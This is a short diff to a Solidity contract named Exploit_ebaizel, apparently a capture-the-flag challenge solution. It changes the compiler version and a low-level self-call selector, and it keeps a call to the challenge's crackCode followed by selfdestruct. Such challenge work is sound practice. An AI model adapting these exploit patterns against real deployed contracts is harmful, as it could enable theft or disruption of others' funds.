@@ -1,5 +1,5 @@
 // SPDX-License-Identifier: UNLICENSED
-pragma solidity 0.8.11;
+pragma solidity >=0.8.0;
 
 import "hardhat/console.sol";
 
@@ -16,7 +16,7 @@ contract Exploit_ebaizel {
 
     function finalize() external payable {
         uint8 ff = 0xff;
-        address(this).call(abi.encodePacked(abi.encodeWithSelector(IChallenge_ebaizel.crackCode.selector, uint8(42))));
+        address(this).call(abi.encodePacked(abi.encodeWithSelector(Exploit_ebaizel.foo.selector, uint16(42))));
         instance.crackCode(42);
 
         selfdestruct(payable(address(this)));
